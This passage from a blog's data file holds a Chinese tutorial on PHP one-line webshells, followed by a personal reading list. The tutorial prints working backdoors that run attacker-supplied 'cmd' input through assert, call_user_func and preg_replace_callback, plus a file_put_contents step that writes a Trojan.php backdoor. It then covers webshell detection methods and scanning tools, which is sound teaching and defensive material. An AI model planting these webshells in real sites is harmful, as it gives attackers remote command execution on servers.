class=\"line\">&#x2F;&#x2F;eval($tmp);</span><br><span class=\"line\">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class=\"line\">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;assert($_GET[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;call_user_func(system(&quot;date&quot;));</span><br><span class=\"line\">call_user_func(assert,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;@call_user_func(assert,phpinfo());</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>如下图所示显示为空</p>\n<p><img src=\"/images/webshell/image-20200910210011420.png\" alt=\"image-20200910210011420\"></p>\n<p>绕过</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class=\"line\">&#x2F;&#x2F;eval($tmp);</span><br><span class=\"line\">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class=\"line\">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;assert($_GET[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;call_user_func(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;call_user_func(assert,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">@call_user_func(assert,phpinfo());</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200910210301627.png\" alt=\"image-20200910210301627\"></p>\n<p>由以上<code>assert()</code>函数介绍，给 assert() 函数传入字符串参数，这个特性在 7.2 禁用。</p>\n<p>因为通过超全局常量 <code>$_GET[&#39;&#39;]</code>获取的攻击者输入是字符串，这样传入assert函数就触发了禁用。</p>\n<p>但是直接<code>assert(phpinfo())</code>传入的参数是函数，所以就不会触发函数禁用，可以正常回显。</p>\n<p>此时更换PHP版本为<code>7.0.33</code>如下图所示可以显示。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class=\"line\">&#x2F;&#x2F;eval($tmp);</span><br><span class=\"line\">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class=\"line\">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;assert($_GET[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;call_user_func(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;call_user_func(assert,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;@call_user_func(assert,phpinfo());</span><br><span class=\"line\"></span><br><span class=\"line\">@call_user_func(assert,$_GET[&#39;cmd&#39;]);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200911104416978.png\" alt=\"image-20200911104416978\"></p>\n<p>更换7.1.20尝试，无法显示phpinfo信息</p>\n<p><img src=\"/images/webshell/image-20200911104522817.png\" alt=\"image-20200911104522817\"></p>\n<p>这个禁用特性其实是从 php 7.1 版本开始，所以 <code>call_user_func + assert</code> 构造的一句话木马在 php 7.0 版本及以下可以使用。</p>\n<h5 id=\"preg-replace-callback\"><a href=\"#preg-replace-callback\" class=\"headerlink\" title=\"preg_replace_callback\"></a>preg_replace_callback</h5><p> <code>preg_replace /e</code> 函数写 webshell，因为此函数5.5.0及以上版本已经被弃用了。使用 preg_replace_callback() 代替。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class=\"line\">&#x2F;&#x2F;eval($tmp);</span><br><span class=\"line\">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class=\"line\">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;assert($_GET[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;call_user_func(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;call_user_func(assert,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;@call_user_func(assert,phpinfo());</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;@call_user_func(assert,$_GET[&#39;cmd&#39;]);</span><br><span class=\"line\"></span><br><span class=\"line\">preg_replace_callback(&#39;&#x2F;.+&#x2F;i&#39;, create_function(&#39;$arr&#39;, &#39;return assert($arr[0]);&#39;), $_REQUEST[&#39;cmd&#39;]);</span><br><span class=\"line\"></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>此 webshell 的原理为：通过 <code>create_function</code> “创造”一个函数，它接受一个数组，并将数组的第一个元素$arr[0]传入assert。</p>\n<p><img src=\"/images/webshell/image-20200911105751006.png\" alt=\"image-20200911105751006\"></p>\n<h5 id=\"file-put-contents\"><a href=\"#file-put-contents\" class=\"headerlink\" title=\"file_put_contents\"></a>file_put_contents</h5><p>webshell 调试三部曲：</p>\n<ol>\n<li>把函数写在 php 文件中，看能否执行</li>\n<li>写成 <code>$_GET[&#39;&#39;]</code> 方式传入命令，看能否执行</li>\n<li>写成 <code>$_POST[&#39;&#39;]</code>方式传入命令，能能否执行命令<br><code>注：</code>2、3步可以合成通过<code>$_REQUEST[&#39;&#39;]</code>方法传入命令。</li>\n</ol>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;eval(system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp&#x3D;&#39;system(&quot;&#39;.$_GET[cmd].&#39;&quot;);&#39;;</span><br><span class=\"line\">&#x2F;&#x2F;eval($tmp);</span><br><span class=\"line\">&#x2F;&#x2F;@eval($_POST[cmd]);</span><br><span class=\"line\">&#x2F;&#x2F;assert(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;assert($_GET[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,system(&#39;date&#39;));</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;$tmp &#x3D; create_function(&#39;&#39;,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;$tmp();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;call_user_func(system(&quot;date&quot;));</span><br><span class=\"line\">&#x2F;&#x2F;call_user_func(assert,$_POST[&#39;cmd&#39;]);</span><br><span class=\"line\">&#x2F;&#x2F;@call_user_func(assert,phpinfo());</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;@call_user_func(assert,$_GET[&#39;cmd&#39;]);</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;preg_replace_callback(&#39;&#x2F;.+&#x2F;i&#39;, create_function(&#39;$arr&#39;, &#39;return assert($arr[0]);&#39;), $_REQUEST[&#39;cmd&#39;]);</span><br><span class=\"line\"></span><br><span class=\"line\">$test&#x3D;&#39;&lt;?php $a&#x3D;$_POST[&quot;cmd&quot;];assert($a); ?&gt;&#39;;</span><br><span class=\"line\">file_put_contents(&quot;Trojan.php&quot;, $test);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>上面这个 webshell 利用函数生成 <code>Trojan.php</code> 木马文件。<br><code>file_put_contents</code> 函数：生成一个文件。第一个参数是文件名，第二个参数是文件的内容。</p>\n<p><img src=\"/images/webshell/image-20200911110201716.png\" alt=\"image-20200911110201716\"></p>\n<p><img src=\"/images/webshell/image-20200911110325971.png\" alt=\"image-20200911110325971\"></p>\n<p>如上图所示：命令成功执行</p>\n<h5 id=\"exec\"><a href=\"#exec\" class=\"headerlink\" title=\"exec\"></a>exec</h5><p>exec()功能是将命令作为参数，但不输出结果。如果指定了第二个可选参数，则返回结果为数组。否则，如果回显，只显示结果的最后一行。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">exec(&quot;ls&quot;)</span><br><span class=\"line\">&#x2F;&#x2F;echo exec(&quot;ls&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>无法回显，使用<code>exec()</code>函数执行echo命令，只会输出最后一行命令结果。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;exec(&quot;ls&quot;)</span><br><span class=\"line\">echo exec(&quot;ls&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200911111810853.png\" alt=\"image-20200911111810853\"></p>\n<p>如果指定了第二个参数，则返回结果为数组。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">&#x2F;&#x2F;exec(&quot;ls&quot;)</span><br><span class=\"line\">exec(&quot;ls&quot;,$array);</span><br><span class=\"line\">print_r($array);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"/images/webshell/image-20200911111954897.png\" alt=\"image-20200911111954897\"></p>\n<h5 id=\"shell-exec\"><a href=\"#shell-exec\" class=\"headerlink\" title=\"shell_exec\"></a>shell_exec</h5><p>shell_exec()函数类似于exec()，但是，其整个输出结果为字符串。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo shell_exec(&quot;ls -al&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200911112228548.png\" alt=\"image-20200911112228548\"></p>\n<h5 id=\"passthru\"><a href=\"#passthru\" class=\"headerlink\" title=\"passthru\"></a>passthru</h5><p>passthru()执行一个命令并返回原始格式的输出.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">passthru(&quot;ls -l&quot;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/webshell/image-20200911112637207.png\" alt=\"image-20200911112637207\"></p>\n<h4 id=\"检测手段\"><a href=\"#检测手段\" class=\"headerlink\" title=\"检测手段\"></a>检测手段</h4><h5 id=\"静态检测\"><a href=\"#静态检测\" class=\"headerlink\" title=\"静态检测\"></a>静态检测</h5><p>攻击者入侵服务器，使用Webshell，不管是传文件还是改文件，必然有一个文件会包含webshell代码，很容易想到从文件代码入手，这是静态特征检测。</p>\n<p>静态检测通过匹配特征码，特征值，危险函数函数来查找webshell的方法，只能查找已知的webshell，且误报、漏报率会比较高，但如果规则完善，可以减低误报率，但是漏报率必定会有所提高。优点是快速方便，对已知的webshell查找准确率高，部署方便，一个脚本就能搞定。</p>\n<p>缺点漏报率、误报率高，无法查找0day型webshell，而且容易被绕过。对于单站点的网站，用静态检测还是有很大好处，配合人工，能快速定位webshell，但是如果是一个成千上万站点的大型企业呢，这个时候再人肉那工作量可就大了。</p>\n<p>因此用这样一种思路：强弱特征。即把特征码分为强弱两种特征，强特征命中则必是webshell；弱特征由人工去判断。加入一种强特征，即把流行webshell用到的特征作为强特征重点监控，一旦出现这样的特征即可确认为webshell立即进行响应。要解决误报和漏报，就不能拘泥于代码级别了。</p>\n<p>同时结合文件系统。结合文件的属性来判断，比如apache是noboy启动的，webshell的属主必然也是nobody，如果我的Web目录无缘无故多了个nobody属主的文件，这里就有问题了。最理想的办法是需要制度和流程来建设一个web目录唯一发布入口，控制住这个入口，非法进来的Web文件自然可以发现。</p>\n<h5 id=\"动态检测\"><a href=\"#动态检测\" class=\"headerlink\" title=\"动态检测\"></a>动态检测</h5><p>Webshell运行后，B/S数据通过HTTP交互，HTTP请求/响应中可以找到蛛丝马迹，这是动态特征检测。</p>\n<p>Webshell传到服务器了，总要去执行它，Webshell执行时刻表现出来的特征，我们称为动态特征。Webshell通信是HTTP协议。只要我们把Webshell特有的HTTP请求/响应做成特征库，加到IDS里面去检测所有的HTTP请求就好了。</p>\n<p>webshell起来如果执行系统命令的话，会有进程。Linux下就是nobody用户起了bash，Win下就是IIS User启动cmd，这些都是动态特征。</p>\n<h5 id=\"日志检测\"><a href=\"#日志检测\" class=\"headerlink\" title=\"日志检测\"></a>日志检测</h5><p>访问Webshell一般不会在系统日志中留下记录，但是会在网站的<code>web日志</code>中留下Webshell页面的访问数据和数据提交记录。日志分析检测技术通过大量的日志文件建立请求模型从而检测出异常文件，称之为：HTTP异常请求模型检测。</p>\n<p>例如：一个平时是GET的请求改用POST请求并且返回代码为200、某个页面的访问者IP、访问时间具有规律性等。</p>\n<h4 id=\"Tools\"><a href=\"#Tools\" class=\"headerlink\" title=\"Tools\"></a>Tools</h4><p>以上介绍了部分检测手段，当然也少不了一些自动化工具(如下)，但是还需人工协助实现对Webshell检测的误报率。</p>\n<p><a href=\"https://github.com/he1m4n6a/findWebshell\">findWebshell</a></p>\n<p>一款本地检测Webshell工具，基本Webshell均可检测。可down到本地测试。检测脚本使用python编写。</p>\n<p><a href=\"http://www.d99net.net/News.asp?id=47\">D盾</a></p>\n<p>一款Windows客户端检测Webshell检测工具。较多人使用，具体使用下载本地测试即可。</p>\n<p><a href=\"https://www.shellpub.com/\">河马</a></p>\n<p>官网介绍：专注webshell查杀研究。拥有海量webshell样本和自主查杀技术，采用传统特征+云端大数据双引擎的查杀技术。查杀速度快、精度高、误报低。</p>\n<p><a href=\"http://www.safedog.cn/\">安全狗</a></p>\n<p>网站、服务器的检测，同时可以支持安全攻击防御，webshell检测等功能。</p>\n<h4 id=\"Referer\"><a href=\"#Referer\" class=\"headerlink\" title=\"Referer\"></a>Referer</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;02aac12e459f</span><br><span class=\"line\">http:&#x2F;&#x2F;blog.leanote.com&#x2F;post&#x2F;snowming&#x2F;2e1ab18dfa80</span><br><span class=\"line\">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;he1m4n6a&#x2F;p&#x2F;9245155.html</span><br></pre></td></tr></table></figure>\n\n"},{"title":"Book","date":"2019-02-28T18:03:30.000Z","_content":"\n多读书的好处不言而喻,时刻提醒自己\"山外有山\"的道理,而高度出现的成因自然由读书来决定大部,多读书,读好书.分享工作及生活中读到的好书和读过的书.\n读书使您我更强大!\n![](/images/Book/book.jpeg)\n\n<center>图片来自\"开眼\"</center>\n### 计算机类书籍\n\n《图解HTTP协议》---读完\n\n《网络是怎样连接的》---未读完\n\n《鸟哥的Linux私房菜 第三版》---未看完\n\n《Tcp/IP协议》卷一---未看完\n\n《Linux Shell脚本攻略 第三版》---正在阅度4/3\n\n### Web安全书籍\n\n《Web前端黑客技术揭秘》---未看完\n\n《Web安全深度剖析》---未看完\n\n《SQL注入攻击与防御》---未看完\n\n《代码审计：企业级Web代码安全架构》---未看完\n\n### 移动应用安全书籍\n\n《Android安全攻防权威指南》---未看完\n\n《Android软件安全权威指南-丰生强》---未看完\n\n《有趣的二进制-软件安全与逆向分析》--未看完\n\n\n### 编程技术\n\n《python基础编程 第二版》---未看完\n\n《C专家编程》---待撸\n\n### 小说(生活读物)\n#### 东野圭吾\n《嫌疑人X的献身》---读完\n\n《白夜行》---读完\n\n《恶意》---读完\n\n《沉睡的人鱼之家》---读完\n\n《解忧杂货店》---读完\n\n#### 三毛\n\n《撒哈拉的故事》 ---读完\n\n#### 路遥\n\n《平凡的世界》---读完\n\n#### 余华\n\n《活着》---读完\n\n#### Gabrielle Zevin(加布瑞埃拉·泽文)\n\n《岛上书店》---读完\n\n#### Claire Mcfall(克莱儿·麦克福尔)\n\n《摆渡人》---读完\n\n《摆渡人2》---读完\n\n#### 弗雷德里克·巴克曼\n\n《一个叫欧维的男人决定去死》---读完\n\n《外婆的道歉信》---读完\n\n#### 若泽·毛罗·德瓦斯康塞洛斯\n\n《我亲爱的甜橙树》---读完\n\n#### 马尔科姆-格拉德威尔\n\n《异类》\n\n《墨菲定律》\n","source":"_posts/book.md","raw":"---\ntitle: Book\ndate: 2019-03-01 02:03:30\ntag:\n\t- Books\n---\n\n多读书的好处不言而喻,时刻提醒自己\"山外有山\"的道理,而高度出现的成因自然由读书来决定大部,多读书,读好书.分享工作及生活中读到的好书和读过的书.\n读书使您我更强大!\n![](/images/Book/book.jpeg)\n\n<center>图片来自\"开眼\"</center>\n### 计算机类书籍\n\n《图解HTTP协议》---读完\n\n《网络是怎样连接的》---未读完\n\n《鸟哥的Linux私房菜 第三版》---未看完\n\n《Tcp/IP协议》卷一---未看完\n\n《Linux Shell脚本攻略 第三版》---正在阅度4/3\n\n### Web安全书籍\n\n《Web前端黑客技术揭秘》---未看完\n\n《Web安全深度剖析》---未看完\n\n《SQL注入攻击与防御》---未看完\n\n《代码审计：企业级Web代码安全架构》---未看完\n\n### 移动应用安全书籍\n\n《Android安全攻防权威指南》---未看完\n\n《Android软件安全权威指南-丰生强》---未看完\n\n《有趣的二进制-软件安全与逆向分析》--未看完\n\n\n### 编程技术\n\n《python基础编程 第二版》---未看完\n\n《C专家编程》---待撸\n\n### 小说(生活读物)\n#### 东野圭吾\n《嫌疑人X的献身》---读完\n\n《白夜行》---读完\n\n《恶意》---读完\n\n《沉睡的人鱼之家》---读完\n\n《解忧杂货店》---读完\n\n#### 三毛\n\n《撒哈拉的故事》 ---读完\n\n#### 路遥\n\n《平凡的世界》---读完\n\n#### 余华\n\n《活着》---读完\n\n#### Gabrielle Zevin(加布瑞埃拉·泽文)\n\n《岛上书店》---读完\n\n#### Claire Mcfall(克莱儿·麦克福尔)\n\n《摆渡人》---读完\n\n《摆渡人2》---读完\n\n#### 弗雷德里克·巴克曼\n\n《一个叫欧维的男人决定去死》---读完\n\n《外婆的道歉信》---读完\n\n#### 若泽·毛罗·德瓦斯康塞洛斯\n\n《我亲爱的甜橙树》---读完\n\n#### 马尔科姆-格拉德威尔\n\n《异类》\n\n《墨菲定律》\n","slug":"book","published":1,"updated":"2020-10-23T04:27:27.891Z","_id":"ckglobhdx000ob1hq8jpba0dz","comments":1,"layout":"post","photos":[],"link":"","content":"<p>多读书的好处不言而喻,时刻提醒自己”山外有山”的道理,而高度出现的成因自然由读书来决定大部,多读书,读好书.分享工作及生活中读到的好书和读过的书.<br>读书使您我更强大!<br><img src=\"/images/Book/book.jpeg\"></p>\n<center>图片来自\"开眼\"</center>\n### 计算机类书籍\n\n<p>《图解HTTP协议》—读完</p>\n<p>《网络是怎样连接的》—未读完</p>\n<p>《鸟哥的Linux私房菜 第三版》—未看完</p>\n<p>《Tcp/IP协议》卷一—未看完</p>\n<p>《Linux Shell脚本攻略 第三版》—正在阅度4/3</p>\n<h3 id=\"Web安全书籍\"><a href=\"#Web安全书籍\" class=\"headerlink\" title=\"Web安全书籍\"></a>Web安全书籍</h3><p>《Web前端黑客技术揭秘》—未看完</p>\n<p>《Web安全深度剖析》—未看完</p>\n<p>《SQL注入攻击与防御》—未看完</p>\n<p>《代码审计：企业级Web代码安全架构》—未看完</p>\n<h3 id=\"移动应用安全书籍\"><a href=\"#移动应用安全书籍\" class=\"headerlink\" title=\"移动应用安全书籍\"></a>移动应用安全书籍</h3><p>《Android安全攻防权威指南》—未看完</p>\n<p>《Android软件安全权威指南-丰生强》—未看完</p>\n<p>《有趣的二进制-软件安全与逆向分析》–未看完</p>\n<h3 id=\"编程技术\"><a href=\"#编程技术\" class=\"headerlink\" title=\"编程技术\"></a>编程技术</h3><p>《python基础编程 第二版》—未看完</p>\n<p>《C专家编程》—待撸</p>\n<h3 id=\"小说-生活读物\"><a href=\"#小说-生活读物\" class=\"headerlink\" title=\"小说(生活读物)\"></a>小说(生活读物)</h3><h4 id=\"东野圭吾\"><a href=\"#东野圭吾\" class=\"headerlink\" title=\"东野圭吾\"></a>东野圭吾</h4><p>《嫌疑人X的献身》—读完</p>\n<p>《白夜行》—读完</p>\n<p>《恶意》—读完</p>\n<p>《沉睡的人鱼之家》—读完</p>\n<p>《解忧杂货店》—读完</p>\n<h4 id=\"三毛\"><a href=\"#三毛\" class=\"headerlink\" title=\"三毛\"></a>三毛</h4><p>《撒哈拉的故事》 —读完</p>\n<h4 id=\"路遥\"><a href=\"#路遥\" class=\"headerlink\" title=\"路遥\"></a>路遥</h4><p>《平凡的世界》—读完</p>\n<h4 id=\"余华\"><a href=\"#余华\" class=\"headerlink\" title=\"余华\"></a>余华</h4><p>《活着》—读完</p>\n<h4 id=\"Gabrielle-Zevin-加布瑞埃拉·泽文\"><a href=\"#Gabrielle-Zevin-加布瑞埃拉·泽文\" class=\"headerlink\" title=\"Gabrielle Zevin(加布瑞埃拉·泽文)\"></a>Gabrielle Zevin(加布瑞埃拉·泽文)</h4><p>《岛上书店》—读完</p>\n<h4 id=\"Claire-Mcfall-克莱儿·麦克福尔\"><a href=\"#Claire-Mcfall-克莱儿·麦克福尔\" class=\"headerlink\" title=\"Claire Mcfall(克莱儿·麦克福尔)\"></a>Claire Mcfall(克莱儿·麦克福尔)</h4><p>《摆渡人》—读完</p>\n<p>《摆渡人2》—读完</p>\n<h4 id=\"弗雷德里克·巴克曼\"><a href=\"#弗雷德里克·巴克曼\" class=\"headerlink\" title=\"弗雷德里克·巴克曼\"></a>弗雷德里克·巴克曼</h4><p>《一个叫欧维的男人决定去死》—读完</p>\n<p>《外婆的道歉信》—读完</p>\n<h4 id=\"若泽·毛罗·德瓦斯康塞洛斯\"><a href=\"#若泽·毛罗·德瓦斯康塞洛斯\" class=\"headerlink\" title=\"若泽·毛罗·德瓦斯康塞洛斯\"></a>若泽·毛罗·德瓦斯康塞洛斯</h4><p>《我亲爱的甜橙树》—读完</p>\n<h4 id=\"马尔科姆-格拉德威尔\"><a href=\"#马尔科姆-格拉德威尔\" class=\"headerlink\" title=\"马尔科姆-格拉德威尔\"></a>马尔科姆-格拉德威尔</h4><p>《异类》</p>\n<p>《墨菲定律》</p>\n","site":{"data":{}},"excerpt":"","more":"<p>多读书的好处不言而喻,时刻提醒自己”山外有山”的道理,而高度出现的成因自然由读书来决定大部,多读书,读好书.分享工作及生活中读到的好书和读过的书.<br>读书使您我更强大!<br><img src=\"/images/Book/book.jpeg\"></p>\n<center>图片来自\"开眼\"</center>\n### 计算机类书籍\n\n<p>《图解HTTP协议》—读完</p>\n<p>《网络是怎样连接的》—未读完</p>\n<p>《鸟哥的Linux私房菜 第三版》—未看完</p>\n<p>《Tcp/IP协议》卷一—未看完</p>\n<p>《Linux Shell脚本攻略 第三版》—正在阅度4/3</p>\n<h3 id=\"Web安全书籍\"><a href=\"#Web安全书籍\" class=\"headerlink\" title=\"Web安全书籍\"></a>Web安全书籍</h3><p>《Web前端黑客技术揭秘》—未看完</p>\n<p>《Web安全深度剖析》—未看完</p>\n<p>《SQL注入攻击与防御》—未看完</p>\n<p>《代码审计：企业级Web代码安全架构》—未看完</p>\n<h3 id=\"移动应用安全书籍\"><a href=\"#移动应用安全书籍\" class=\"headerlink\" title=\"移动应用安全书籍\"></a>移动应用安全书籍</h3><p>《Android安全攻防权威指南》—未看完</p>\n<p>《Android软件安全权威指南-丰生强》—未看完</p>\n<p>《有趣的二进制-软件安全与逆向分析》–未看完</p>\n<h3 id=\"编程技术\"><a href=\"#编程技术\" class=\"headerlink\" title=\"编程技术\"></a>编程技术</h3><p>《python基础编程 第二版》—未看完</p>\n<p>《C专家编程》—待撸</p>\n<h3 id=\"小说-生活读物\"><a href=\"#小说-生活读物\" class=\"headerlink\" title=\"小说(生活读物)\"></a>小说(生活读物)</h3><h4 id=\"东野圭吾\"><a href=\"#东野圭吾\" class=\"headerlink\" 